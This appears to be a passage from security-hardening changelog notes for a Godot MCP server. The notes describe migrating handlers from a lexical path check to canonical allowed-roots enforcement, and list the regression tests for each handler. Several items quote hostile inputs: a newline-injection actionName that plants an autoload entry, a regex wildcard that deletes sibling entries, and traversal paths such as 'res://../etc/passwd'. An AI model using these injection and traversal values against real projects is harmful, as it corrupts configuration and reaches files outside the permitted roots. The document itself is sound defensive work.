    same `PathPolicy.assertProject(args.projectPath)` + `PathPolicy.resolveProjectMember
    (projectRoot, args.<member>)` pattern the sibling `manage_shader` /
    `set_main_scene` / `manage_translations` gates already use, so the
    canonical-root contract is enforced in the handler body itself. Wire-level
    coverage in `tests/core-file-io-injection.test.ts` (16 tests): 5 "outside
    allowed roots" denials (one per handler), 4 `..` traversal denials, 1
    absolute-path denial, 1 byte-identical rollback assertion after a rejected
    `write_file`, and 3 benign acceptance paths (`read_file`, `write_file`,
    `rename_file`) that confirm the canonical happy path still works. The tests
    invoke the private handler methods directly via `(server as any).handleXxx(args)`
    (bypassing `tools/call`) to prove the gate lives in the handler body itself,
    not only in the request-boundary guard.

20. The same defense-in-depth gate class persisted in five script and resource
    handlers: `handleValidateScript` and `handleValidateScripts` resolved
    `projectPath` and `scriptPath` through lexical `validatePath` and then
    `join(args.projectPath, ...)`-ed the result into `existsSync`/`runGdScriptCheck`
    (validation), `handleCreateScript` wrote `args.source` to `join(args.projectPath,
    args.scriptPath)` after `mkdirSync(dirname, { recursive: true })`, and
    `handleCreateResource` and `handleManageResource` resolved `resourcePath`
    through lexical `validatePath` before dispatching to `headlessOp` with the
    raw `args.resourcePath` (the asset-import prerequisite probe runs inside
    `try/catch`, so a `..`-bearing resourcePath that escaped the project root
    would silently bypass the request-boundary gate if it was ever invoked
    outside the standard `CallToolRequest` path). Each handler now resolves
    `projectRoot` through `this.pathPolicy.assertProject(args.projectPath)` and
    the member path (`scriptPath` / `resourcePath`) through
    `this.pathPolicy.resolveProjectMember(projectRoot, args.<member>)`, returning
    a typed `isError: true` envelope BEFORE any filesystem call when either
    resolution throws. `handleValidateScripts` additionally propagates the
    resolved `projectRoot` through `listChangedGdFiles`, `listAllGdFiles`, and
    the inner `runGdScriptCheck`/`join` calls so a symlinked project root is
    honored consistently with the request-boundary guard. Wire-level coverage in
    `tests/script-resource-handler-injection.test.ts` (10 tests): 4 "outside
    allowed roots" denials (`validate_script`, `validate_scripts`, `create_script`,
    `create_resource`, `manage_resource`), 4 `..` traversal denials
    (`validate_script`, `create_script`, `create_resource`, `manage_resource`),
    1 byte-identical rollback assertion after a rejected `create_script` write,
    and 1 benign-acceptance `validate_scripts` path. `handleCreateCsharpScript`
    carries the same lexical-`validatePath` boundary but is intentionally out of
    scope for this package because it is gated downstream by the
    script-kind/project-kind gate introduced for [Coding-Solo#114]; the sibling
    migration is filed as the next-follow-up release gate. The handler-body gate
    mirrors item 19 and matches the sibling `manage_shader` /
    `set_main_scene` / `manage_translations` / `core_file_io` pattern.

21. The same content-injection class persisted in `handleManageInputMap`
    and `handleManageExportPresets`. `manage_input_map` interpolated
    `${args.actionName}` directly into a Godot input-map block under
    `[input]` and built its lookup/remove `RegExp` from a partially
    escaped user string; `manage_export_presets` interpolated
    `${args.name}` and `${args.platform}` directly into a Godot
    INI-style block in `export_presets.cfg`. A caller could pass
    `actionName = "Evil\n[autoload]\nFoo=\"*res://evil.gd\""` (or the
    equivalent `name` for export presets) to silently corrupt
    unrelated sections, or pass `actionName = ".*"` and let the
    `remove` regex wipe every sibling input action / preset block in
    the same regex scope. The lexical `validatePath` boundary on
    `projectPath` only rejected empty / `..`-bearing strings (letting
    newlines / quotes / brackets through). The takeover now applies
    the same strict identifier gate as items 14-18:
    `manage_input_map` `add` and `remove` require `actionName` to
    match `/^[A-Za-z_][A-Za-z0-9_]*$/`; `manage_export_presets`
    `add` requires `name` to match the same strict identifier regex
    and `platform` to match `/^[A-Za-z][A-Za-z0-9 _.\-/]*$/` (a
    Godot-platform-shaped value that accepts `Windows Desktop`,
    `Linux/X11`, `macOS`, `Web`, `Android`, `iOS` and rejects
    newlines, quotes, brackets, and `;`); `manage_export_presets`
    `remove` uses the same identifier gate on `name`. Both handlers
    are atomic: every rejection must leave the underlying file
    byte-identical to its pre-call snapshot. Wire-level coverage in
    `tests/manage-input-map-export-presets-injection.test.ts` (13
    tests): 3 `manage_input_map` rejection branches (section-breaking
    newline, equals sign, regex wildcard), 1 benign `add`, 1 precise
    `remove`, 1 `list`; 4 `manage_export_presets` rejection branches
    (section-breaking newline, closing bracket, non-allowlist
    platform, regex wildcard), 1 benign `add`, 1 precise `remove`,
    1 `list`. The byte-identical rollback assertion is repeated
    after every rejected mutation.

22. The same lexical-`validatePath` defense-in-depth class persisted in
    ten additional project-file/scene/settings/sprite/mesh-library/
    export handlers. Each handler historically opened with
    `if (!validatePath(args.projectPath) || !validatePath(args.<member>))`
    and then `join(args.projectPath, args.<member>)`-ed the user-supplied
    values into `existsSync` / `readFileSync` / `writeFileSync` /
    `executeOperation` / `execFileAsync`. While the request-boundary
    `assertSafeToolPaths` already rejects every canonical member path
    that would escape the configured `PathPolicy` roots BEFORE the
    handler is called, the handler bodies themselves did not formally
    adopt the canonical-root contract. If a future refactor bypassed
    the boundary guard (e.g., by invoking a handler outside the
    standard `CallToolRequest` path, or by a future internal admin
    tool that routed directly to the handler), the lexical
    `validatePath` was too weak to enforce the configured
    allowed-roots list. The ten handlers are: `handleListProjects`
    (the `args.directory` path), `handleGetProjectInfo`,
    `handleSaveScene` (project + `scenePath` + optional `newPath`),
    `handleGetUid` (project + `filePath`), `handleReadProjectSettings`,
    `handleModifyProjectSettings`, `handleListProjectFiles`,
    `handleLoadSprite` (project + `scenePath` + `texturePath` —
    `nodePath` is a runtime scene-graph identifier, not a filesystem
    path, so it stays unchanged), `handleExportMeshLibrary`
    (project + `scenePath` + `outputPath`), and `handleExportProject`
    (project; `outputPath` and `presetName` are runtime arguments to
    the Godot CLI, not filesystem paths under the project root).
    `handleRunProject` also dropped its redundant lexical
    `validatePath(args.projectPath)` because `pathPolicy.allowsProject`
    and `pathPolicy.assertProject` (already present below it) enforce
    the same canonical-root contract; its `args.scene` lexical check
    stays because `args.scene` is a runtime Godot CLI argument, not a
    filesystem path under the project root. The takeover now applies
    the same `PathPolicy.assertProject(args.projectPath)` +
    `PathPolicy.resolveProjectMember(projectRoot, args.<member>)`
    pattern the sibling `manage_shader` / `set_main_scene` /
    `manage_translations` / `core_file_io` / `script-resource-handler`
    gates already use, returning a typed `isError: true` envelope
    BEFORE any filesystem or subprocess call when either resolution
    throws. The downstream `handleRunProject` / `manage_input_map` /
    `manage_export_presets` / `manage_autoloads` /
    `handleCreateProject` / `handleCreateCsharpScript` /
    `handleValidateScripts` handlers still carry the lexical
    boundary; their migration is the next-follow-up release gate.
    `handleCreateProject` and `handleCreateCsharpScript` are deferred
    because the target path / script does not yet exist and the
    `assertProject` canonicalization requires an existing path;
    `handleCreateProject` will need a separate `allowsProject`
    (rather than `assertProject`) gate plus a downstream write-gate
    that prevents the new path from leaking outside the configured
    allowed roots. `handleRunProject` / `manage_input_map` /
    `manage_export_presets` / `manage_autoloads` are straightforward
    follow-ups with no semantic differences from the pattern applied
    here; `handleValidateScripts` carries the same lexical boundary
    on `rel` (a relative path produced by `listChangedGdFiles` /
    `listAllGdFiles`) and needs a separate audit because explicit
    `args.scriptPaths` user input requires a `resolveProjectMember`
    gate that is not currently applied. Wire-level coverage in
    `tests/info-scene-settings-handler-injection.test.ts` (20 tests):
    10 "outside allowed roots" denials (one per handler, exercised
    against a `pathPolicy` configured with only the project root),
    1 `..` traversal denial for `list_projects.directory`, 1 `..`
    traversal denial for `save_scene.scenePath`, 1 `..` traversal
    denial for `save_scene.newPath`, 1 `..` traversal denial for
    `get_uid.filePath`, 1 `..` traversal denial for
    `load_sprite.texturePath`, 1 `..` traversal denial for
    `export_mesh_library.outputPath`, 1 absolute-path denial for
    `save_scene.scenePath`, 1 absolute-path denial for
    `load_sprite.scenePath`, 1 absolute-path denial for
    `export_mesh_library.outputPath`, and 1 byte-identical rollback
    assertion for `modify_project_settings`. The tests invoke the
    private handler methods directly via `(server as any).handleXxx(args)`
    (bypassing `tools/call`) to prove the gate lives in the handler
    body itself, not only in the request-boundary guard. The
    `handleListProjects` directory scan uses `pathPolicy.allowsProject`
    (rather than `assertProject`) because the directory may not yet
    exist; the handler itself creates or walks the tree. The
    `handleRunProject` cleanup drops the redundant lexical boundary;
    no test exercises it because `pathPolicy.assertProject` already
    proves the same contract through every other port.


23. The lexical-`validatePath` defense-in-depth gap persisted in three
    sibling handlers whose strict-input gates (items 14, 15, 21) already
    protect against content injection but whose `projectPath` boundary
    still relied on the lexical-only check: `handleManageAutoloads`,
    `handleManageInputMap`, and `handleManageExportPresets`. Each
    handler historically opened with
    `if (!validatePath(args.projectPath)) return createErrorResponse('Invalid path.');`
    and then `join(args.projectPath, 'project.godot')`-ed the
    user-supplied value into `existsSync` / `readFileSync` /
    `writeFileSync`. The lexical `validatePath` only rejects empty /
    `..`-prefixed / null-byte strings and does not enforce the
    configured `PathPolicy` allowed roots. The request-boundary
    `assertSafeToolPaths` guard already rejects every projectPath that
    escapes the configured `PathPolicy` roots BEFORE the handler is
    called, so the runtime is not exposed to a fresh escape. This
    package proves the same contract is enforced *inside the handler
    body itself* by replacing the lexical boundary with
    `pathPolicy.assertProject(args.projectPath)` and returning a typed
    `isError: true` envelope (`Project path is outside the configured
    allowed roots: ...`) BEFORE any filesystem read or write. The
    canonical `projectRoot` is then used for `join(projectRoot,
    'project.godot')`, `join(projectRoot, 'export_presets.cfg')`, the
    `existsSync` / `readFileSync` / `writeFileSync` calls, and the
    `Not a valid Godot project: ${projectRoot}` error message so the
    operator sees the resolved canonical path. The package preserves
    every existing strict-input gate: `manage_autoloads` strict
    identifier regex on `name`, strict `res://` + relative-member
    gate on `path`, anchored per-line `remove` regex; `manage_input_map`
    strict identifier regex on `actionName`; `manage_export_presets`
    strict identifier regex on `name` plus the
    `/^[A-Za-z][A-Za-z0-9 _.\-/]*$/` allowlist on `platform`. Wire-level
    coverage in
    `tests/manage-autoloads-input-map-export-presets-handler-injection.test.ts`
    (6 tests): each handler rejects a `projectPath` outside the
    configured allowed roots for both `list` and `add` actions; every
    rejection surfaces the canonical-root error message and never the
    `Not a valid Godot project` fallback. The tests invoke the private
    handler methods directly via `(server as any).handleXxx(args)`
    (bypassing `tools/call`) to prove the gate lives in the handler
    body itself, not only in the request-boundary guard.

24. The lexical-`validatePath` defense-in-depth gap persisted in three
    sibling handlers that delegate straight to the shared `headlessOp`
    helper without their own PathPolicy gate: `handleManageSceneSignals`,
    `handleManageThemeResource`, and `handleManageSceneStructure`. Each
    handler historically delegated to `headlessOp`, which opens with
    `if (!validatePath(projectPath)) return createErrorResponse('Invalid path.');`
    and then `join(projectPath, 'project.godot')`-ed the user-supplied
    value into `existsSync`. The lexical `validatePath` only rejects
    empty / `..`-prefixed / null-byte strings and does not enforce the
    configured `PathPolicy` allowed roots. The shared helper also
    forwards `args.scenePath` / `args.resourcePath` verbatim to the
    Godot headless operation as `res://` paths (with an auto-prepend
    fallback in the GDScript side), so a caller could pass
    `scenePath = 'res://../etc/passwd'` or an absolute path and bypass
    the canonical-project-member contract entirely. The takeover now
    applies the same `pathPolicy.assertProject(args.projectPath)` +
    `pathPolicy.resolveProjectMember(projectRoot, args.scenePath | args.resourcePath)`
    pattern the sibling `core_file_io` / `manage_shader` /
    `set_main_scene` / `manage_translations` / `manage_autoloads` /
    `manage_input_map` / `manage_export_presets` / `manage_layers` /
    `manage_plugins` / `info-scene-settings-handler` /
    `script-resource-handler` gates already use, returning a typed
    `isError: true` envelope BEFORE any `headlessOp` delegation when
    either resolution throws. The shared `headlessOp` lexical
    boundary remains in place as redundant defense-in-depth and is the
    next-follow-up refactor target (deferred because it requires
    auditing every `headlessOp` caller for handler-level ownership of
    the gate). Wire-level coverage in
    `tests/manage-scene-signals-theme-resource-scene-structure-handler-injection.test.ts`
    (6 tests): each handler rejects a `projectPath` outside the
    configured allowed roots AND rejects a `scenePath` / `resourcePath`
    whose canonical realpath would escape the project root via `..`
    traversal. Every rejection surfaces the canonical-root /
    canonical-member error message and never the `Not a valid Godot
    project` fallback or a Godot spawn error. The tests invoke the
    private handler methods directly via `(server as any).handleXxx(args)`
    (bypassing `tools/call`) to prove the gate lives in the handler
    body itself, not only in the request-boundary guard.

25. The remaining lexical-`validatePath` defense-in-depth gap persisted
    in three additional sibling handlers that the previous packages
    identified as the next-follow-up batch:

    - **`handleCreateProject`** — the only sibling handler whose target
      `args.projectPath` legitimately does not yet exist on disk. The
      handler historically opened with
      `if (!validatePath(args.projectPath)) return createErrorResponse('Invalid path.');`
      and then `mkdirSync`'d the user-supplied path and `writeFileSync`-ed
      a `project.godot` file into it. The lexical `validatePath` only
      rejects empty / `..`-prefixed / null-byte strings, so any other
      absolute path was silently `mkdirSync`-ed (and a `project.godot`
      written into a directory the operator never intended to register
      as a Godot project). The takeover now applies the same
      `pathPolicy.assertProject(args.projectPath)` pattern the sibling
      gates already use, returning a typed `isError: true` envelope
      `Project path is outside the configured allowed roots: ...`
      BEFORE any `mkdirSync` / `writeFileSync` call. The
      `pathPolicy.canonicalizeNearest` walk-up-the-nearest-existing-ancestor
      strategy means non-existent targets still canonicalize correctly
      without losing the canonical-root contract. The package preserves
      the `A project.godot already exists at this path` check, the
      `.csproj` write path, and the success message — only the
      canonical root and the error wording now flow through
      `pathPolicy.assertProject`.

    - **`handleCreateCsharpScript`** — a two-path sibling handler
      that opens with
      `if (!validatePath(args.projectPath) || !validatePath(args.scriptPath)) return createErrorResponse('Invalid path.')`
      and then `join(args.projectPath, args.scriptPath)`-ed the
      user-supplied values into `mkdirSync` / `writeFileSync`. The
      lexical `validatePath` only rejects empty / `..`-prefixed /
      null-byte strings and lets absolute paths through: an attacker
      could pass `scriptPath = 'C:/Windows/System32/evil.cs'` and the
      handler would `mkdirSync` a `C:/Windows/System32` directory
      inside the project tree (the joined path resolved relative to
      the project root, so the failure mode was an `ENOENT` from a
      nested `mkdirSync` rather than a typed denial). The takeover now
      applies the same `pathPolicy.assertProject(args.projectPath)` +
      `pathPolicy.resolveProjectMember(projectRoot, args.scriptPath)`
      pattern the sibling `create_project` + `manage_scene_signals` /
      `manage_theme_resource` / `manage_scene_structure` /
      `core_file_io` / `manage_shader` / `set_main_scene` /
      `manage_translations` gates already use, returning a typed
      `isError: true` envelope BEFORE any `mkdirSync` /
      `writeFileSync` call. The canonical `projectRoot` is then used
      for `join(projectRoot, 'project.godot')`, the
      `isDotnetProject(projectRoot)` check, and the
      `Not a valid Godot project: ${projectRoot}` error message so the
      operator sees the resolved canonical path. The package preserves
      every existing strict-input gate: `scriptPath must end with .cs`,
      the `isValidCsharpIdentifier` file-base check, the
      `className === fileBase` invariant, and the success message.

    - **`handleValidateScripts`** — already had
      `pathPolicy.assertProject` on `args.projectPath` (introduced in
      commit `b9fe537`), but the inner candidate loop at line 7062
      still relied on lexical `validatePath(rel)` for both
      listChangedGdFiles / listAllGdFiles internal-relative paths AND
      user-supplied explicit `args.scriptPaths`. The lexical check
      only rejects empty / `..`-prefixed / null-byte strings, so an
      explicit absolute `scriptPaths` entry (`C:/Windows/System32/evil.gd`)
      slipped through and was silently checked against
      `existsSync(join(projectRoot, 'C:/Windows/System32/evil.gd'))`,
      which on Windows finds the absolute-path file existence but on
      POSIX looks for the literal path inside the project root. The
      takeover now applies `pathPolicy.resolveProjectMember(projectRoot, candidate)`
      to every explicit `args.scriptPaths` entry BEFORE any
      `existsSync` / `runGdScriptCheck` call, returning a typed
      `isError: true` envelope
      `Invalid scriptPath "${candidate}": ...` when the canonical-member
      contract fails. Internal-relative paths from
      `listChangedGdFiles` / `listAllGdFiles` continue to flow through
      the lexical `validatePath(rel)` check at line 7062 because they
      are produced by trusted internal scanners, not user input.

    Wire-level coverage in `tests/create-project-handler-injection.test.ts`
    (5 tests) and `tests/validate-scripts-handler-injection.test.ts`
    (3 tests), for a combined 8 new tests:

    - **`create_project`** (2 tests): `projectPath` outside the
      configured allowed roots rejected; absolute `projectPath`
      resolving outside the configured allowed roots rejected AND the
      handler does not create a `project.godot` inside the outside-roots
      sentinel directory.
    - **`create_csharp_script`** (3 tests): `projectPath` outside the
      configured allowed roots rejected (and the `.NET project` fallback
      is NOT the surface message); `scriptPath` `..` traversal rejected;
      absolute `scriptPath` (`C:/Windows/System32/evil.cs`) rejected
      with a typed canonical-member error message BEFORE any
      `mkdirSync` / `writeFileSync` fires.
    - **`validate_scripts`** (3 tests): `projectPath` outside the
      configured allowed roots rejected (the existing pathPolicy gate
      is already correct — covered as regression); explicit
      `scriptPaths` absolute-path escape rejected with a typed
      canonical-member error message; explicit `scriptPaths` `..`
      traversal rejected.

    The tests invoke the private handler methods directly via
    `(server as any).handleXxx(args)` (bypassing `tools/call`), the
    same wiring pattern as the sibling `info-scene-settings-handler` /
    `script-resource-handler` / `manage-autoloads-input-map-export-presets-handler` /
    `manage-scene-signals-theme-resource-scene-structure-handler` gates.
    Every `projectPath`-outside-roots rejection asserts the
    canonical-root error message AND asserts the relevant fallback
    (`A project.godot already exists`, `Failed to create project`,
    `Not a valid Godot project`, `Not a Godot .NET project`) is
    *absent*, so the gate is proven to fire BEFORE any filesystem
    reach. Every `scriptPath` canonical-member rejection asserts the
    canonical-member error message AND asserts the
    `create_csharp_script failed: ...` / Godot spawn fallback is
    *absent*, so the gate is proven to fire BEFORE any `mkdirSync` /
    `writeFileSync`.

    The remaining deferred handlers from the previous handoff's
    "next safe action" list are: the shared `headlessOp` lexical
    boundary at line 681 (deferred because it requires auditing every
    `headlessOp` caller for handler-level ownership of the gate);
    `handleRunProject` `args.scene` (runtime Godot CLI argument, not a
    filesystem path under the project root); and the inner-loop
    lexical `validatePath(rel)` check at line 7062 inside
    `handleValidateScripts` for `listChangedGdFiles` /
    `listAllGdFiles` internal-relative paths (deferred because those
    paths are produced by trusted internal scanners, not user input).

26. The `handleAttachScript` defense-in-depth gate was the last sibling
    handler that delegated straight to `headlessOp` without a
    handler-body PathPolicy contract. The handler historically opened
    only with the script-kind / project-kind gate (closes
    `Coding-Solo#114`) and then `delegate`-d to `headlessOp`, which
    opens with a single
    `if (!validatePath(projectPath)) return createErrorResponse('Invalid path.');`
    lexical check. Of the seven `headlessOp` callers
    (`attach_script`, `create_resource`, `manage_resource`,
    `manage_scene_signals`, `manage_theme_resource`,
    `manage_scene_structure`), six already own a handler-body
    `pathPolicy.assertProject(args.projectPath)` + optional
    `pathPolicy.resolveProjectMember(projectRoot, ...)` gate that
    returns a typed `isError: true` envelope BEFORE any `headlessOp`
    delegation; only `handleAttachScript` did not. An
    outside-configured-allowed-roots invocation then reached
    `headlessOp` and either failed the lexical check with a generic
    `'Invalid path.'` message or escaped past it to the Godot spawn
    fallback. The takeover now applies the same canonical-root
    enforcement (`pathPolicy.assertProject(args.projectPath)` replaces
    lexical `validatePath`) plus a canonical-member enforcement for
    `scenePath` and `scriptPath` (`pathPolicy.resolveProjectMember
    (projectRoot, args.<member>)`) so a caller can never reach the
    C# / .NET kind gate or `headlessOp` with a member path that
    configured allowed roots. The canonical `projectRoot` is then
    passed to both the `.NET` project-kind probe and the shared
    `headlessOp` delegation so downstream filesystem/subprocess code
    cannot re-enter through the caller's non-canonical spelling. The
    package preserves the existing
    script-kind / project-kind gate and the C# / .NET kind gate in
    their original order; the new gates fire strictly BEFORE both.
    Wire-level coverage in `tests/attach-script-handler-injection.test.ts`
    (6 tests): `projectPath` outside the configured allowed roots
    rejected with the canonical-root message AND the
    `Not a valid Godot project` fallback proven absent; `scenePath`
    `..` traversal rejected with the canonical-member message; `scriptPath`
    `..` traversal rejected with the canonical-member message;
    absolute-path `scenePath` (`C:/Windows/System32/notepad.exe`)
    rejected with the canonical-member message; absolute-path
    `scriptPath` rejected with the canonical-member message BEFORE any
    `isDotnetProject` / `headlessOp` call; benign `.gd` accept path
    preserves the existing happy path. The tests invoke the private
    handler method directly via `(server as any).handleAttachScript(args)`
    (bypassing `tools/call`), the same wiring pattern as the sibling
    `manage-scene-signals-theme-resource-scene-structure-handler-injection`
    gate, so the wire-level coverage proves the gate lives in the
    handler body itself, not only in the request-boundary guard.

    The remaining deferred handlers from this package's "next safe
    action" list are the original three: the shared `headlessOp`
    lexical boundary at line 681 (now defensible defense-in-depth
    because all six remaining handlers own their own gates, but not
    removed in this branch because the audit still requires a
    regression-coverage pass against any future caller added without
    its own gate); `handleRunProject` `args.scene` (runtime Godot CLI
    argument, not a filesystem path under the project root); and the
    inner-loop lexical `validatePath(rel)` check inside
    `handleValidateScripts` for `listChangedGdFiles` /
    `listAllGdFiles` internal-relative paths (deferred because those
    paths are produced by trusted internal scanners, not user input).

19. The shared `GodotServer.headlessOp` helper carried the last remaining lexical `validatePath(projectPath)` boundary in the headless-operation path. The boundary only rejected empty / `..` / null-byte strings and did not enforce the configured `PathPolicy` allowed roots, so an external caller that bypassed every handler-body gate (or a future handler added without its own gate) could pass a project root that escaped the configured allowed roots and reach the operation runner with a non-canonical host path. The takeover now replaces the lexical `validatePath(projectPath)` line with `this.pathPolicy.assertProject(projectPath)` and a typed `isError: true` envelope BEFORE the project-file existence check, BEFORE the operation runner spawns Godot, and BEFORE any stderr escapes into the caller. `headlessOp` now canonicalizes the project root and forwards the canonical path into both the existence check and the operation runner, so every caller of the shared helper observes a single source of truth for the canonical-root contract on the headless-operation path. Wire-level coverage in `tests/headless-op-path-policy-gate.test.ts` (5 tests): `projectPath` outside the configured allowed roots is rejected with the canonical-root envelope BEFORE the project-file check; relative `projectPath` that resolves outside the allowed roots via `..` traversal is rejected with the canonical-root envelope; absolute `projectPath` (e.g. `C:/Windows/System32`) is rejected with the canonical-root envelope; empty / undefined `projectPath` still surfaces the existing `projectPath is required` message (no regression); the canonical project root is forwarded to the operation runner (no lexical shadowing of `realpathSync`-canonicalised paths). The `validatePath` helper is retained for the two deferred call sites (`handleRunProject` `args.scene` runtime Godot CLI argument, `handleValidateScripts` inner-loop trusted scanner output) explicitly preserved in the handoff; `tests/handlers.test.ts` updates the legacy source-text assertion that previously expected the lexical `validatePath` line, replacing it with the new `this.pathPolicy.assertProject(projectPath)` contract assertion.

27. [Coding-Solo#49](https://github.com/Coding-Solo/godot-mcp/issues/49) Windows JSON quoting: investigation on this host (Node v24.17.0 on Windows 10) attempted to reproduce the original risk class with several probes and found that Node's default `spawn(command, [args], { shell: false })` already preserves JSON operation parameters containing Windows path backslashes, embedded double quotes, and Unicode — the `args` array is forwarded to `CreateProcessW` via libuv and the child receives each token intact. The historical corruption mode (Node dropping or mangling JSON payloads beginning with `\“`) does not reproduce on Node ≥ 20. Two wire-level round-trip tests in `tests/operation-runner-windows-argv.test.ts` exercise the real `runHeadlessOperation` against a real Node child with a JSON fixture containing every Windows-specific edge case and assert byte-for-byte equality through `JSON.parse`. A pure helper module at `src/godot/windows-argv.ts` exports `quoteForCommandLineToArgvW`, `formatWindowsVerbatimArgv`, and `needsWindowsVerbatimArgv` — the documented Microsoft `CommandLineToArgvW` quoting rules — tested independently with seven pure-helper tests covering the trailing-backslash escape, embedded quotes, Unicode preservation, and a round-trip through a CommandLineToArgvW-equivalent parser. The helper is retained for any future Godot-side consumer (e.g. a custom `.bat` shim or a Godot build with a non-standard argv parser) that needs to construct a Windows-safe command line without going through Node's `windowsVerbatimArguments` path. The shared `headlessOp` spawn call is intentionally unchanged: the default `{ shell: false, windowsHide: true }` options are correct on both POSIX and Windows for every JSON arg the runner has ever produced, and switching to the verbatim-arguments path on Windows would corrupt executable discovery for paths containing spaces (e.g. `C:\Program Files\...`) because Node's `spawn` constructs the cmdline by joining args with spaces and `CreateProcessW` re-parses the first token as the executable name. Real Godot end-to-end verification of the JSON-arg round-trip in a live Godot runtime remains the next-follow-up release gate.

28. The `handleRunProject.args.scene` lexical `validatePath(args.scene)`
    boundary was the last remaining user-input `validatePath(...)`
    call in the source tree. The previous ten PathPolicy migration
    packages (items 14–27 plus the `handleAttachScript` and
    `headlessOp` follow-ups) replaced the lexical `validatePath(projectPath)`
    boundary on every project-member endpoint with
    `pathPolicy.assertProject(args.projectPath)` +
    `pathPolicy.resolveProjectMember(projectRoot, args.<member>)` and
    a typed `isError: true` envelope BEFORE any filesystem or
    subprocess delegation. `handleRunProject.args.scene` is the
    runtime Godot CLI argument that flows directly into
    `spawnProcess(cmdArgs)`. Item 22 explicitly deferred this boundary
    because it is a CLI argument, not a filesystem path under the
    project root, but the same defense-in-depth argument that closed
    the sibling gates applies here: a lexical `validatePath`
    boundary only rejects empty / `..`-prefixed / null-byte strings
    and lets absolute host paths through, so a caller could pass
    `scene = 'C:/Windows/System32/notepad.exe'` (or a
    `scene = 'res://../etc/passwd'` traversal) and observe the value
    in `cmdArgs` after the gate silently allowed it. The takeover
    now applies the same `pathPolicy.resolveProjectMember(projectPath,
    args.scene)` canonical-member gate the sibling
    `create_csharp_script` / `manage_scene_signals` /
    `manage_theme_resource` / `manage_scene_structure` / core
    `script-resource` gates already use, returning a typed
    `isError: true` envelope (`Invalid scene: ...`) BEFORE any
    `spawnProcess` call. The verbatim `args.scene` (with its native
    `res://` or relative prefix) is forwarded into `cmdArgs` so
    Godot's CLI parser still observes its documented contract; only
    the canonical-root / canonical-member check fires first. The
    `validatePath` helper is intentionally retained for the
    `handleValidateScripts` inner-loop trusted scanner output
    (line 7062), which deals with internal relative paths produced
    by `listChangedGdFiles` / `listAllGdFiles`, not user input.
    Wire-level coverage in
    `tests/run-project-scene-pathpolicy-gate.test.ts` (4 tests):
    `args.scene` whose canonical realpath would escape the project
    root via `..` traversal (caught by
    `pathPolicy.resolveProjectMember`); `args.scene` that is an
    absolute host path outside the project root (`C:/Windows/...`)
    caught by the canonical-member contract; `args.scene` mixing
    forward and back slashes in a `..` traversal rejected by the
    canonical-member contract; benign `args.scene = 'res://scenes/Main.tscn'`
    accepted and forwarded verbatim into `spawnProcess` cmdArgs.
    Every rejection test stubs `spawnProcess` to assert the gate
    fires BEFORE any process spawn. The accept test stubs
    `spawnProcess`, `stopActiveProcess`,
    `allocateRuntimeCredentials`, `runtimeEnvironment`,
    `injectInteractionServer`, `observeStartup`, and the
    runtimeConnector so the happy path returns without spawning
    Godot; `cmdArgs` is asserted to contain the verbatim
    `args.scene` so a future maintainer cannot silently drop or
    rewrite the runtime CLI argument. The tests invoke the private
    handler method directly via
    `(server as any).handleRunProject(args)` (bypassing
    `tools/call`), mirroring the sibling
    `attach-script-handler-injection` /
    `manage-scene-signals-theme-resource-scene-structure-handler-injection`
    gate patterns. `tests/handlers.test.ts` adds a focused
    source-text assertion (handler-source-structure test) that
    inspects only non-comment lines of `handleRunProject` and
    confirms both that `pathPolicy.resolveProjectMember(projectPath,
    args.scene)` is present and that no active-code
    `validatePath(...)` invocation remains in `handleRunProject`.

    The deferred lexical `validatePath` callers in
        `handleValidateScripts` (line 7062 / line 7200) remain the
        next-follow-up because they operate on internal relative
        paths from `listChangedGdFiles` / `listAllGdFiles` (trusted
        internal scanners), not user input; explicit
        `args.scriptPaths` user input is already gated by
        `pathPolicy.resolveProjectMember` from item 25.

    29. The `handleValidateScripts` inner-loop scanner-output check was the
        last remaining active-code lexical `validatePath(...)` call in the
        source tree. The handler historically opened every candidate `rel`
        string from `listChangedGdFiles` / `listAllGdFiles` with
        `if (!/\.gd$/i.test(rel) || !validatePath(rel))`, where the lexical
        `validatePath` only rejected empty / `..` / null-byte strings and let
        absolute host paths (e.g. `C:/Windows/System32/evil.gd`) through.
        A scanner-produced relative path whose canonical realpath resolved
        outside the project root via a symlink (e.g. `<projectRoot>/scripts`
        is a symlink to a directory outside the project root) would pass the
        lexical check, satisfy `existsSync(join(projectRoot, rel))` because
        `existsSync` follows the symlink, and queue the file for
        `runGdScriptCheck`. The takeover now applies the canonical
        `pathPolicy.resolveProjectMember(projectRoot, rel)` contract the
        sibling `core_file_io` / `manage_shader` / `set_main_scene` /
        `manage_translations` / `script-resource-handler` /
        `info-scene-settings-handler` /
        `manage_scene_signals / manage_theme_resource /
        manage_scene_structure` gates already enforce on every member path,
        returning a typed `isError: true` envelope (or, for the
        non-explicit-scanner branch, silently dropping the file) BEFORE any
        `existsSync` / `runGdScriptCheck` call when the canonical-member
        check throws. The original `rel` is preserved in the response
        contract so the tool's documented output shape is unchanged; the
        canonical realpath is forwarded into `existsSync` and
        `runGdScriptCheck` so downstream code observes the canonical form.
        The legacy `validatePath` helper has been retired alongside its
        last active call site: the function definition is deleted from
        `src/utils.ts`, the export is removed from the `src/server.ts`
        import block, the `tests/utils.test.ts` `describe('validatePath')`
        block is removed, and `tests/handlers.test.ts`'s `fakeHeadlessOp`
        test stub mirrors the production `headlessOp` behavior by
        rejecting `..`-bearing paths with the same canonical-root error
        message. Wire-level coverage in
        `tests/validate-scripts-handler-injection.test.ts` (now 5 tests, +2
        new): a scanner-output symlink-escape path is intercepted BEFORE
        `runGdScriptCheck` fires, and a scanner-output
        `scripts/player.gd` path is accepted and forwarded to
        `runGdScriptCheck`. A source-text assertion in
        `tests/handlers.test.ts` confirms the `handleValidateScripts` body
        contains `pathPolicy.resolveProjectMember(projectRoot, rel)` and
        no remaining active-code `validatePath(...)` invocation. The
        previous eleven PathPolicy migration packages (items 14-26 plus
        `handleAttachScript` and `headlessOp`) closed the
        request-boundary `assertSafeToolPaths` guard and the handler-body
        `pathPolicy.assertProject` + `pathPolicy.resolveProjectMember`
        gate on every project-bearing tool. This package retires the last
        lexical boundary that survived that sweep.
